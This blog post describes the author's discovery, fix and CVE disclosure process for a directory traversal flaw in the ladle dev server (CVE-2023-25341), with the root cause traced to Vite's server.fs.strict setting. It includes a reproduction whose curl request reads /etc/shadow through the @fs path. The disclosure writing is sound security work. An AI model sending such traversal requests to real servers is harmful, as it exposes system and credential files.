<!DOCTYPE html><html lang="en"> <head><!-- Global Metadata --><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><meta name="generator" content="Astro v4.16.18"><!-- Font preloads --><link rel="preload" href="/fonts/comic-mono-latin-400-normal.woff2" as="font" type="font/woff" crossorigin><link rel="preload" href="/fonts/comic-mono-latin-700-normal.woff2" as="font" type="font/woff" crossorigin><link rel="preload" href="/fonts/IBMPlexMono-Text.woff2" as="font" type="font/woff" crossorigin><link rel="preload" href="/fonts/IBMPlexMono-Bold.woff2" as="font" type="font/woff" crossorigin><!-- Canonical URL --><link rel="canonical" href="https://runjak.codes/posts/2024-03-21-ladle-cve/"><!-- Primary Meta Tags --><title>runjak.codes: An old CVE in ladle</title><meta name="title" content="runjak.codes: An old CVE in ladle"><meta name="description" content="About a year ago I found a CVE in ladle and struggled with disclosing it."><!-- Open Graph / Facebook --><meta property="og:type" content="website"><meta property="og:url" content="https://runjak.codes/posts/2024-03-21-ladle-cve/"><meta property="og:title" content="runjak.codes: An old CVE in ladle"><meta property="og:description" content="About a year ago I found a CVE in ladle and struggled with disclosing it."><meta property="og:image" content="https://runjak.codes/profile.jpg"><!-- Twitter --><meta property="twitter:card" content="summary_large_image"><meta property="twitter:url" content="https://runjak.codes/posts/2024-03-21-ladle-cve/"><meta property="twitter:title" content="runjak.codes: An old CVE in ladle"><meta property="twitter:description" content="About a year ago I found a CVE in ladle and struggled with disclosing it."><meta property="twitter:image" content="https://runjak.codes/profile.jpg"><link rel="stylesheet" href="/_astro/_slug_.7e-O12JA.css"></head> <body class="bg-gradient-to-b from-violet-950 from-33% via-stone-900 via-33% to-stone-900 bg-[length:100%_3px] text-slate-50 __className_702bfe flex justify-center"> <main>   <h1>An old CVE in ladle</h1> <time class="text-xs text-fuchsia-500 text-shadow-none" datetime="2024-03-21T00:00:00.000Z"> 2024-03-21 </time> <a class="text-sm" href="/"> ‚Üê Back to home</a> <section> <p>So. About a year ago I found a <a href="https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures">CVE</a> in <a href="https://www.npmjs.com/package/@ladle/react">@ladle/react</a> <code>&lt;= 2.5.1</code>,
and have since struggled with publishing it. What‚Äôs up with that?</p>
<h2 id="timeline">Timeline</h2>
<dl><dt><time class="text-xs text-fuchsia-500 text-shadow-none" datetime="2023-01-31T00:00:00.000Z"> 2023-01-31 </time></dt><dd>Discovery, reporting, fix deployed</dd><dt><time class="text-xs text-fuchsia-500 text-shadow-none" datetime="2023-02-01T00:00:00.000Z"> 2023-02-01 </time></dt><dd>Requested CVE ID</dd><dt><time class="text-xs text-fuchsia-500 text-shadow-none" datetime="2023-03-08T00:00:00.000Z"> 2023-03-08 </time></dt><dd><p>CVE assigned:
<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-25341">CVE-2023-25341</a></p></dd><dt><time class="text-xs text-fuchsia-500 text-shadow-none" datetime="2023-03-09T00:00:00.000Z"> 2023-03-09 </time></dt><dd>Confusion ü§®</dd><dt><time class="text-xs text-fuchsia-500 text-shadow-none" datetime="2024-03-21T00:00:00.000Z"> 2024-03-21 </time></dt><dd>This post, apparently</dd><dt><time class="text-xs text-fuchsia-500 text-shadow-none" datetime="2024-03-24T00:00:00.000Z"> 2024-03-24 </time></dt><dd>CVE request for publication</dd><dt><time class="text-xs text-fuchsia-500 text-shadow-none" datetime="2024-03-28T00:00:00.000Z"> 2024-03-28 </time></dt><dd>CVE published üéâ</dd></dl>
<h3 id="whats-a-ladle">What‚Äôs a ladle?</h3>
<p><a href="https://ladle.dev/">Ladle</a> is the software we‚Äôre using for our styleguide at work - to develop, test and demo central components of our frontend.
I‚Äôm generally very happy with it - compared with other software I‚Äôve evaluated at the time it was quite flexible and easy to configure.
It also played together with <a href="https://remix.run/">remix</a> way better than <a href="https://storybook.js.org/">storybook</a> did.</p>
<h3 id="discovery">Discovery</h3>
<p>So it was the <time class="text-xs text-fuchsia-500 text-shadow-none" datetime="2023-01-31T00:00:00.000Z"> 2023-01-31 </time> and I was at work fiddling with <a href="https://ladle.dev/">ladle</a>.</p>
<p>I was debugging some react components and watched the network tab in the dev tools.</p>
<p>This led me to discover an issue that allowed attackers over the network to read arbitrary files
from the machine where the ladle dev server was running with access rights of the user running it.</p>
<h3 id="fix">Fix</h3>
<p>I reported the issue to the maintainer after work.
From my perspective the issue was handled with clear understanding and speed and a <a href="https://github.com/tajo/ladle/commit/116f2199637a7945f212e2378ea5bc2c58a0c7fc">fix was published</a> only a few hours later with <a href="https://github.com/tajo/ladle/pull/324">PR #324</a> with <code>@ladle/react</code> version <code>2.5.2</code>.</p>
<h3 id="obtaining-a-cve">Obtaining a CVE</h3>
<p>While I‚Äôve found and fixed some vulnerabilities in the past I‚Äôve never reported a CVE before.
Since the maintainer had no strong interest to pursue this I thought it a good chance to finally have a go at it.</p>
<p>When trying to report a CVE the first step is to figure out the correct channel for reporting.</p>
<p>There are entities called <a href="https://www.cve.org/PartnerInformation/ListofPartners">CVE Numbering Authorities</a> (CNAs),
which take care of some specific projects &amp; products.</p>
<p>After figuring out that there was no dedicated CNA for ladle I decided to follow the
<a href="https://www.cve.org/ReportRequest/ReportRequestForNonCNAs">report directions on cve.org</a>
and ended up reporting the vulnerability through <a href="https://en.wikipedia.org/wiki/Mitre_Corporation">Mitre</a>.</p>
<p>In a repeat exercise today I‚Äôd probably prefer reporting the vulnerability
<a href="https://docs.github.com/en/code-security/security-advisories/guidance-on-reporting-and-writing-information-about-vulnerabilities/about-coordinated-disclosure-of-security-vulnerabilities#about-reporting-and-disclosing-vulnerabilities-in-projects-on-github">through GitHub</a>
instead.</p>
<p>Admittedly GitHub only works for projects hosted there, and different project setups are very fine and good.
However ladle <a href="https://github.com/tajo/ladle">is on GitHub</a> and it seems to me that reporting through
the feature there would‚Äôve been a clearer and faster path for me to follow.</p>
<p>I found several helpful resources towards reporting CVEs - among them slides for a talk called <a href="https://cve.mitre.org/CVEIDsAndHowToGetThem.pdf">CVE IDs and how to get them</a>.
These were certainly helpful, but I still got stranded with the reporting process for quite some time.</p>
<p>I think the biggest hurdle for me here was to figure out what to do next.
The vulnerability was fixed within 24h of me reporting it, but it took another month to obtain a CVE.</p>
<p>My current (<time class="text-xs text-fuchsia-500 text-shadow-none" datetime="2024-03-21T00:00:00.000Z"> 2024-03-21 </time>) idea is
that I need to reference public information to publish the CVE entry.
Hence this post - let‚Äôs hope I can finally figure this out.</p>
<p>I‚Äôd somehow hoped that referencing the fix
and noting in the initial report that it was already fixed would be sufficient to publish a CVE.
This appears to not be the case. Good learning üôÇ.</p>
<h2 id="what-was-the-issue">What was the issue?</h2>
<blockquote>
<p>A directory traversal vulnerability in ladle <code>&lt;=2.5.1</code> dev server<br/>
allows an attacker on the same network<br/>
to read files accessible to the user via GET requests.</p>
</blockquote>
<p>For reproduction let‚Äôs consider the following experiment,
where we‚Äôve got 3 files:</p>
<div class="grid grid-cols-1 sm:grid-cols-[auto_auto_auto] gap-2"><pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="json"><code><span class="line"><span style="color:#6A737D">// package.json</span></span>
<span class="line"><span style="color:#E1E4E8">{</span></span>
<span class="line"><span style="color:#79B8FF">  &quot;dependencies&quot;</span><span style="color:#E1E4E8">: {</span></span>
<span class="line"><span style="color:#79B8FF">    &quot;@ladle/react&quot;</span><span style="color:#E1E4E8">: </span><span style="color:#9ECBFF">&quot;2.5.1&quot;</span></span>
<span class="line"><span style="color:#E1E4E8">  }</span></span>
<span class="line"><span style="color:#E1E4E8">}</span></span>
<span class="line"></span></code></pre><pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#6A737D">// .ladle/config.mjs</span></span>
<span class="line"><span style="color:#F97583">export</span><span style="color:#F97583"> default</span><span style="color:#E1E4E8"> {</span></span>
<span class="line"><span style="color:#E1E4E8">  stories: </span><span style="color:#9ECBFF">&quot;src/**/*.stories.tsx&quot;</span><span style="color:#E1E4E8">,</span></span>
<span class="line"><span style="color:#E1E4E8">  outDir: </span><span style="color:#9ECBFF">&quot;./public/&quot;</span><span style="color:#E1E4E8">,</span></span>
<span class="line"><span style="color:#E1E4E8">};</span></span>
<span class="line"></span></code></pre><pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="javascript"><code><span class="line"><span style="color:#6A737D">// src/hello.stories.tsx</span></span>
<span class="line"><span style="color:#F97583">export</span><span style="color:#F97583"> const</span><span style="color:#79B8FF"> World</span><span style="color:#F97583"> =</span></span>
<span class="line"><span style="color:#E1E4E8">  () </span><span style="color:#F97583">=&gt;</span><span style="color:#E1E4E8"> &lt;</span><span style="color:#85E89D">p</span><span style="color:#E1E4E8">&gt;Hey&lt;/</span><span style="color:#85E89D">p</span><span style="color:#E1E4E8">&gt;;</span></span>
<span class="line"></span></code></pre></div>
<p>Let‚Äôs run the ladle dev server in a container:</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">docker</span><span style="color:#9ECBFF"> run</span><span style="color:#79B8FF"> --rm</span><span style="color:#79B8FF"> -p</span><span style="color:#9ECBFF"> 61000:61000</span><span style="color:#79B8FF"> -v</span><span style="color:#9ECBFF"> `</span><span style="color:#79B8FF">pwd</span><span style="color:#9ECBFF">`</span><span style="color:#B392F0">:/experiment</span><span style="color:#79B8FF"> -it</span><span style="color:#9ECBFF"> node:latest</span><span style="color:#9ECBFF"> bash</span></span>
<span class="line"><span style="color:#B392F0">root@809900b50bc7:/experiment#</span><span style="color:#9ECBFF"> npm</span><span style="color:#9ECBFF"> install</span></span>
<span class="line"><span style="color:#B392F0">root@809900b50bc7:/experiment#</span><span style="color:#9ECBFF"> npx</span><span style="color:#9ECBFF"> ladle</span><span style="color:#9ECBFF"> dev</span></span>
<span class="line"><span style="color:#B392F0">   ‚ï≠‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ïÆ</span></span>
<span class="line"><span style="color:#B392F0">   ‚îÇ</span><span style="color:#9ECBFF">                                                    ‚îÇ</span></span>
<span class="line"><span style="color:#B392F0">   ‚îÇ</span><span style="color:#9ECBFF">   ü•Ñ</span><span style="color:#9ECBFF"> Ladle.dev</span><span style="color:#9ECBFF"> served</span><span style="color:#9ECBFF"> at</span><span style="color:#9ECBFF"> http://localhost:61000/</span><span style="color:#9ECBFF">   ‚îÇ</span></span>
<span class="line"><span style="color:#B392F0">   ‚îÇ</span><span style="color:#9ECBFF">                                                    ‚îÇ</span></span>
<span class="line"><span style="color:#B392F0">   ‚ï∞‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚ïØ</span></span>
<span class="line"></span></code></pre>
<p>We can now visit our hello world story as expected:</p>
<p><img src="/_astro/hello-world.CAMzd5GD_2tcyl9.webp" alt="Screenshot of the hello world example story" width="1542" height="430" loading="lazy" decoding="async"></p>
<p>Looking at the dev tools network tab some requests sparked my attention for having stuff like <code>@fs/experiment/node_modules</code> in their paths:</p>
<p><img src="/_astro/network-tab.BWY0yaGN_Z2glI9x.webp" alt="Screenshot of the network tab in the chrome dev tools" width="2084" height="772" loading="lazy" decoding="async"></p>
<p>ü§î Would this allow me to access more exciting files on my system?</p>
<pre class="astro-code github-dark" style="background-color:#24292e;color:#e1e4e8;overflow-x:auto" tabindex="0" data-language="bash"><code><span class="line"><span style="color:#B392F0">curl</span><span style="color:#9ECBFF"> http://localhost:61000/@fs/etc/shadow</span></span>
<span class="line"><span style="color:#B392F0">root:*:19764:0:99999:7:::</span></span>
<span class="line"><span style="color:#B392F0">daemon:*:19764:0:99999:7:::</span></span>
<span class="line"><span style="color:#B392F0">bin:*:19764:0:99999:7:::</span></span>
<span class="line"><span style="color:#B392F0">sys:*:19764:0:99999:7:::</span></span>
<span class="line"><span style="color:#B392F0">sync:*:19764:0:99999:7:::</span></span>
<span class="line"><span style="color:#B392F0">games:*:19764:0:99999:7:::</span></span>
<span class="line"><span style="color:#B392F0">man:*:19764:0:99999:7:::</span></span>
<span class="line"><span style="color:#B392F0">lp:*:19764:0:99999:7:::</span></span>
<span class="line"><span style="color:#B392F0">mail:*:19764:0:99999:7:::</span></span>
<span class="line"><span style="color:#B392F0">news:*:19764:0:99999:7:::</span></span>
<span class="line"><span style="color:#B392F0">uucp:*:19764:0:99999:7:::</span></span>
<span class="line"><span style="color:#B392F0">proxy:*:19764:0:99999:7:::</span></span>
<span class="line"><span style="color:#B392F0">www-data:*:19764:0:99999:7:::</span></span>
<span class="line"><span style="color:#B392F0">backup:*:19764:0:99999:7:::</span></span>
<span class="line"><span style="color:#B392F0">list:*:19764:0:99999:7:::</span></span>
<span class="line"><span style="color:#B392F0">irc:*:19764:0:99999:7:::</span></span>
<span class="line"><span style="color:#B392F0">_apt:*:19764:0:99999:7:::</span></span>
<span class="line"><span style="color:#B392F0">nobody:*:19764:0:99999:7:::</span></span>
<span class="line"><span style="color:#B392F0">node:!:19766:0:99999:7:::</span></span>
<span class="line"></span></code></pre>
<p>While the dev server states that it listened on <code>localhost:61000</code> it was indeed not restricted to the loopback interface.
This meant that all local networks I‚Äôve been recently using could access all my local files with rights of my current user.</p>
<h2 id="what-went-wrong">What went wrong?</h2>
<ul>
<li>Vite has a setting called <a href="https://vitejs.dev/config/server-options.html#server-fs-strict">server.fs.strict</a>.</li>
<li>Ladle used to configure this setting to <code>false</code> in commit <a href="https://github.com/tajo/ladle/blob/15e179e51d237bbeb153a306c0fcd64f32ec9590/packages/ladle/lib/cli/vite-dev.js#L38">15e179e</a>.</li>
<li>This led to vite exposing the local file system.</li>
<li>Together with the dev server being available on all network interfaces this resulted in exposure of the local file system to arbitrary parties on the same network.</li>
</ul>
<p>A similar issue to this was previously seen in <a href="https://github.com/nuxt/framework/pull/8674">Nuxt dev server</a>.</p>
<p>Existence of settings like <strong>server.fs.strict</strong> strikes me as a dangerous footgun.
It is not immediately clear to me that this setting must exist or would frequently be desired to have.</p> </section>  <footer class="flex flex-col gap-4"> <a class="text-sm" href="/">
‚Üê Back to home
</a> <a class="text-xs" href="/impressum">
Impressum und Datenschutz / Contact and Privacy Policy
</a> </footer> </main> </body></html>